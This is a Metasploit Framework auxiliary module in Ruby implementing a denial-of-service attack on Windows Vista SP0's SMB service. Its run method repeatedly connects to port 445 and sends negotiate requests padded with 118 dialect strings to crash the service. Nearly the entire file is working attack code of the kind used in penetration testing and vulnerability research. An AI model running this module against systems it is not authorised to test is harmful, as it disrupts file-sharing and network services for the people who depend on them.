##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Vista SP0 SMB Negotiate Protocol DoS',
      'Description'    => %q{
        This module exploits a flaw in Windows Vista that allows a remote
      unauthenticated attacker to disable the SMB service. This vulnerability
      was silently fixed in Microsoft Vista Service Pack 1.
      },

      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '64341'],
        ]
    ))

    register_options([Opt::RPORT(445)], self.class)
  end

  def run

    print_status("Sending 100 negotiate requests...");

    # 100 requests ensure that the bug is reliably hit
    1.upto(100) do |i|

      begin

        connect

        # 118 dialects are needed to trigger a non-response
        dialects = ['NT LM 0.12'] * 118

        data = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')

        pkt = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
        pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
        pkt['Payload']['SMB'].v['Flags1'] = 0x18
        pkt['Payload']['SMB'].v['Flags2'] = 0xc853
        pkt['Payload'].v['Payload'] = data
        pkt['Payload']['SMB'].v['ProcessID'] = rand(0x10000)
        pkt['Payload']['SMB'].v['MultiplexID'] = rand(0x10000)

        sock.put(pkt.to_s)

        disconnect

      rescue ::Interrupt
        raise $!

      rescue ::Exception
        print_error("Error at iteration #{i}: #{$!.class} #{$!}")
        return
      end

    end

  end
end
